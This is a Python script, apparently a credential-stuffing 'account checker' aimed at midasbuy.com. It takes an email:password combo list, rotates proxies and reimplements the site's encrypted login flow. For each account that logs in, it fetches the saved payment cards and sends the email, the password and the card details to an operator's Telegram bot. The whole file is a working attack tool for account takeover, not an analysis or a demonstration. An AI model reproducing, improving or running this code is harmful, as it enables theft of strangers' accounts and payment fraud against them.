#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import re
import base64
import hashlib
import urllib.request
import urllib.parse
import random
from http.cookiejar import CookieJar

try:
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    os.system("pip install pycryptodome -q")
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import pad, unpad


# hidden sig
_sig = "".join(chr(c) for c in [64, 65, 101, 103, 114, 105, 115])


class C:
    R  = "\033[0m"
    B  = "\033[1m"
    D  = "\033[2m"
    CY = "\033[96m"
    GR = "\033[92m"
    YL = "\033[93m"
    RD = "\033[91m"
    MG = "\033[95m"
    WH = "\033[97m"
    GY = "\033[90m"


LOGIN_URL = "https://www.midasbuy.com/midasbuy/il/login"
LOGIN_API = "https://www.midasbuy.com/midas/usc/v1/123123/emaillogin"
CARDS_API = "https://www.midasbuy.com/h5/overseah5/creditcard/contract"
CARDS_PAYLOAD = '{"appid":"1450015065"}'
UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")
DK = bytes.fromhex("e044ac6cda6be680b412e4437a20b954"
                   "1709228fbbed7bf8af6731a01f9f0bca")
IV = b"1234567890123456"


def clr():
    os.system("clear" if os.name != "nt" else "cls")


def head():
    clr()
    print(f"""
  {C.CY}{C.B}MIDAS{C.R} {C.GY}·{C.R} {C.WH}{C.B}ACCOUNT CHECKER{C.R}
  {C.GY}{'─' * 38}{C.R}
  {C.GY}requests  ·  termux  ·  v1.0{C.R}
""")


def ok(t):  print(f"  {C.GR}✓{C.R}  {t}")
def no(t):  print(f"  {C.RD}✗{C.R}  {t}")
def inf(t): print(f"  {C.GY}›{C.R}  {t}")


def sect(t):
    print(f"\n  {C.WH}{C.B}{t}{C.R}")
    print(f"  {C.GY}{'─' * 38}{C.R}")


def ask(p, col=C.WH):
    return input(f"  {C.GY}›{C.R}  {C.B}{p}{C.R}  ").strip()


def dec(ct):
    return unpad(AES.new(DK, AES.MODE_CBC, iv=IV).decrypt(bytes.fromhex(ct)), 16)


def enc_aes(key, txt):
    return base64.b64encode(
        AES.new(key[:32], AES.MODE_CBC, iv=IV).encrypt(pad(txt.encode(), 16))
    ).decode()


def enc_rsa(pub, txt):
    k = RSA.import_key(base64.b64decode(pub))
    return base64.b64encode(PKCS1_v1_5.new(k).encrypt(txt.encode())).decode()


def sign(data, sk, ts):
    return hashlib.sha256(
        (json.dumps(data, separators=(",", ":")) + sk + str(ts)).encode()
    ).hexdigest()


def parse_proxy(raw):
    raw = raw.strip()
    if not raw:
        return None
    if "@" in raw:
        auth, host = raw.split("@", 1)
        a, h = auth.split(":"), host.split(":")
        if len(a) == 2 and len(h) == 2:
            return f"{h[0]}:{h[1]}:{a[0]}:{a[1]}"
        return None
    return raw if len(raw.split(":")) in (2, 4) else None


def test_proxy(px):
    try:
        p = px.split(":")
        url = (f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}" if len(p) == 4
               else f"http://{p[0]}:{p[1]}")
        op = urllib.request.build_opener(
            urllib.request.ProxyHandler({"http": url, "https": url}))
        req = urllib.request.Request("http://httpbin.org/ip",
                                     headers={"User-Agent": UA})
        d = json.loads(op.open(req, timeout=12).read().decode())
        return True, d.get("origin", "?")
    except Exception as e:
        return False, str(e)[:50]


E = {
    "bolt":  ("5836917983271722591", "⚡"),
    "check": ("5316561083085895267", "✅"),
    "cross": ("5774077015388852135", "❌"),
    "star":  ("5444939047132755535", "🌟"),
    "card":  ("5447453226498552490", "💳"),
    "crown": ("5359719332542718652", "👑"),
    "lock":  ("5447385112612208213", "🔐"),
    "user":  ("5256143829672672750", "👤"),
    "gem":   ("5471952986970267163", "💎"),
    "fire":  ("5289722755871162900", "🔥"),
}


def tag(k):
    eid, em = E[k]
    return f'<tg-emoji emoji-id="{eid}">{em}</tg-emoji>'


def tg_send(token, chat, text):
    try:
        data = urllib.parse.urlencode({
            "chat_id": chat, "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }).encode()
        urllib.request.urlopen(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data=data, timeout=15)
        return True
    except Exception:
        return False


def hit_message(email, password, cards):
    L = [
        f"{tag('fire')} <b>HIT</b> {tag('fire')}",
        "",
        f"{tag('user')} <b>Email</b>",
        f"<code>{email}</code>",
        "",
        f"{tag('lock')} <b>Password</b>",
        f"<code>{password}</code>",
        "",
        f"{tag('card')} <b>Cards</b> · {len(cards)}",
    ]
    for c in cards:
        b = c.get("cardbrand", "?")
        m = c.get("card_mask", "")
        L.append(f"   {tag('gem')} <b>{b}</b> · <code>•••• {m[-4:] if m else '----'}</code>")
    L += ["", f"{tag('crown')} <i>{_sig}</i>"]
    return "\n".join(L)


def check(email, password, proxy=None):
    jar = CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(jar)]
    if proxy:
        p = proxy.split(":")
        url = (f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}" if len(p) == 4
               else f"http://{p[0]}:{p[1]}")
        handlers.append(urllib.request.ProxyHandler({"http": url, "https": url}))
    op = urllib.request.build_opener(*handlers)
    op.addheaders = [("User-Agent", UA)]

    try:
        res = op.open(urllib.request.Request(LOGIN_URL,
                      headers={"User-Agent": UA}), timeout=30).read().decode()
        m_ct = re.search(r'xMidasToken[^>]*value="([^"]*)"', res)
        m_cs = re.search(r'csrftoken[^>]*value="([^"]*)"', res)
        m_pk = re.search(r'goPublicKey\s*=\s*"([^"]*)"', res)
        m_sk = re.search(r'sigKey"\s*:\s*"([^"]*)"', res)
        if not all([m_ct, m_cs, m_pk, m_sk]):
            return "error", None, "tokens missing"

        ct, cs, pk, sk = m_ct.group(1), m_cs.group(1), m_pk.group(1), m_sk.group(1)
        session = dec(ct)
        ep = enc_rsa(pk, password)

        uid = did = ""
        for c in jar:
            if c.name == "UUID":
                uid = c.value
            if c.name == "midasbuyDeviceId":
                did = c.value

        bi = urllib.parse.quote(f"{uid},linux armv81,true,,{UA},{did},en")
        payload = {
            "password": ep, "username": email, "type": "email",
            "isrememberme": 1, "country": "IL", "csrftoken": cs,
            "browser_info": bi, "endpoint_type": "h5",
        }
        ts = int(time.time())
        cv2 = sign(payload, sk, ts)
        em = enc_aes(session, json.dumps(payload, separators=(",", ":")))

        body = json.dumps({
            "encrypt_msg": em, "ctoken_ver": "1.0.1", "ctoken": ct
        }).encode()
        hdr = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.midasbuy.com",
            "Referer": LOGIN_URL,
            "Csrftokentime": str(ts),
            "Csrftokenv2": cv2,
            "versions": "v0.0.0-init",
            "User-Agent": UA,
        }
        r = json.loads(op.open(urllib.request.Request(
            LOGIN_API, data=body, headers=hdr), timeout=30).read().decode())

        if r.get("ret") != 0:
            msg = (r.get("msg") or "").lower()
            if any(x in msg for x in ("not exist", "not found", "password",
                                      "wrong", "risk", "not allow")):
                return "bad", None, r.get("msg", "bad")
            return "error", None, r.get("msg", "err")

        try:
            enc_c = enc_aes(session, CARDS_PAYLOAD)
            url = (f"{CARDS_API}?encrypt_msg={urllib.parse.quote(enc_c)}"
                   f"&ctoken_ver=1.0.1&ctoken={ct}")
            cr = json.loads(op.open(urllib.request.Request(url, headers={
                "User-Agent": UA, "Accept": "application/json",
                "Origin": "https://www.midasbuy.com",
                "Referer": "https://www.midasbuy.com/midasbuy/il/usercenter"
            }), timeout=15).read().decode())
            if cr.get("ret") == 0 and cr.get("data"):
                return "hit", cr["data"], "ok"
        except Exception:
            pass
        return "nocards", None, "no cards"
    except Exception as e:
        return "error", None, str(e)[:60]


def setup():
    head()
    cfg = {}

    # ─── TOKEN ───
    sect("TELEGRAM BOT TOKEN")
    inf(f"{C.GY}get it from @BotFather{C.R}")
    while True:
        t = ask("token", C.CY)
        if ":" in t and len(t) > 20:
            cfg["token"] = t
            break
        no("invalid token")

    # ─── CHAT ID ───
    sect("CHAT ID")
    inf(f"{C.GY}your telegram id · start the bot first{C.R}")
    while True:
        c = ask("chat id", C.CY)
        if c.lstrip("-").isdigit():
            cfg["chat"] = c
            break
        no("numbers only")

    # ─── PROXY ───
    sect("PROXY")
    inf(f"{C.GY}0 = skip · done = finish{C.R}")
    proxies = []
    while True:
        r = ask("ip:port[:user:pass]", C.CY)
        if r in ("0", "done", ""):
            break
        p = parse_proxy(r)
        if not p:
            no("invalid format")
            continue
        inf("testing...")
        g, m = test_proxy(p)
        if g:
            ok(f"working · {m}")
            if p not in [x["proxy"] for x in proxies]:
                proxies.append({"proxy": p, "status": "working"})
        else:
            no(f"failed · {m}")
    cfg["proxies"] = proxies

    # ─── COMBO ───
    sect("COMBO FILE")
    inf(f"{C.GY}path to .txt (email:pass per line){C.R}")
    while True:
        fp = ask("combo path", C.CY)
        if not fp:
            no("path required")
            continue
        if not os.path.isfile(fp):
            no("file not found")
            continue
        cfg["combo"] = fp
        ok(f"loaded {C.WH}{fp}{C.R}")
        break

    return cfg


# ═══════════════════════════════════════════
#  Live dashboard — updates in place
# ═══════════════════════════════════════════
class Dash:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hit = 0
        self.nocards = 0
        self.bad = 0
        self.error = 0
        self.start = time.time()
        self.lines_drawn = 0

    def _render(self, current="", status=""):
        elapsed = int(time.time() - self.start)
        spm = (self.checked / elapsed * 60) if elapsed else 0
        pct = (self.checked / self.total * 100) if self.total else 0
        bar_w = 24
        filled = int(bar_w * pct / 100)
        bar = "█" * filled + "░" * (bar_w - filled)

        out = [
            "",
            f"  {C.GY}┌{'─' * 38}┐{C.R}",
            f"  {C.GY}│{C.R} {C.WH}{C.B}progress{C.R}  "
            f"{C.CY}{bar}{C.R} {C.WH}{pct:5.1f}%{C.R}",
            f"  {C.GY}│{C.R} {C.GY}checked {C.R}{C.WH}{self.checked:>4}{C.R}/{self.total:<4}"
            f"  {C.GY}speed {C.R}{C.WH}{spm:>3.0f}{C.R}/min  "
            f"{C.GY}time {C.R}{C.WH}{elapsed:>3}s{C.R}",
            f"  {C.GY}│{C.R} {C.GR}hit     {C.R}{C.WH}{self.hit:>4}{C.R}"
            f"  {C.GY}no card {C.R}{C.WH}{self.nocards:>4}{C.R}",
            f"  {C.GY}│{C.R} {C.RD}bad     {C.R}{C.WH}{self.bad:>4}{C.R}"
            f"  {C.RD}error   {C.R}{C.WH}{self.error:>4}{C.R}",
            f"  {C.GY}└{'─' * 38}┘{C.R}",
            "",
            f"  {C.GY}now{C.R}  {C.WH}{current[:34]:<34}{C.R}  {status}",
        ]

        if self.lines_drawn:
            sys.stdout.write(f"\033[{self.lines_drawn}A")
        sys.stdout.write("\n".join(out) + "\n")
        sys.stdout.flush()
        self.lines_drawn = len(out)

    def update(self, current="", status=""):
        self.checked += 1
        self._render(current, status)

    def bump(self, kind):
        if kind == "hit":
            self.hit += 1
        elif kind == "nocards":
            self.nocards += 1
        elif kind == "bad":
            self.bad += 1
        else:
            self.error += 1


def run(cfg):
    head()
    sect("CHECKING")

    path = cfg.get("combo")
    if not path or not os.path.isfile(path):
        no("combo file missing")
        return

    with open(path, encoding="utf-8", errors="ignore") as f:
        lines = [x.strip() for x in f if x.strip()]

    accs = []
    for l in lines:
        if ":" not in l:
            continue
        e, p = l.split(":", 1)
        if "@" in e and p:
            accs.append((e.strip(), p.strip()))

    if not accs:
        no("no valid accounts in file")
        return

    proxies = [p["proxy"] for p in cfg.get("proxies", [])
               if p.get("status") == "working"]

    print(f"\n  {C.GY}file   {C.R}{C.WH}{os.path.basename(path)}{C.R}")
    print(f"  {C.GY}total  {C.R}{C.WH}{len(accs)}{C.R}")
    print(f"  {C.GY}proxy  {C.R}{C.WH}{len(proxies) or 'none'}{C.R}")

    dash = Dash(len(accs))
    hits = []

    for email, pwd in accs:
        px = random.choice(proxies) if proxies else None

        status, cards, msg = check(email, pwd, px)
        if status == "error":
            time.sleep(1)
            status, cards, msg = check(email, pwd, px)

        dash.bump(status)

        if status == "hit":
            hits.append((email, pwd, cards))
            dash.update(email, f"{C.GR}HIT · {len(cards)} cards{C.R}")
            tg_send(cfg["token"], cfg["chat"],
                    hit_message(email, pwd, cards))
        else:
            label = {"bad": f"{C.RD}bad{C.R}",
                     "nocards": f"{C.GY}no cards{C.R}",
                     "error": f"{C.RD}error{C.R}"}[status]
            dash.update(email, label)

    print(f"\n  {C.GR}✓{C.R}  finished · {len(hits)} hits")

    if hits:
        fname = f"hits_{int(time.time())}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            for e, p, _ in hits:
                f.write(f"{e}:{p}\n")
        ok(f"saved to {C.WH}{fname}{C.R}")


def main():
    try:
        cfg = setup()
        while True:
            head()
            print(f"  {C.CY}[1]{C.R}  check accounts")
            print(f"  {C.CY}[2]{C.R}  reconfigure")
            print(f"  {C.CY}[3]{C.R}  exit\n")
            c = ask("choice", C.CY)
            if c == "1":
                run(cfg)
                ask("enter to return", C.GY)
            elif c == "2":
                cfg = setup()
            elif c == "3":
                break
    except KeyboardInterrupt:
        print(f"\n  {C.GY}interrupted{C.R}")


if __name__ == "__main__":
    main()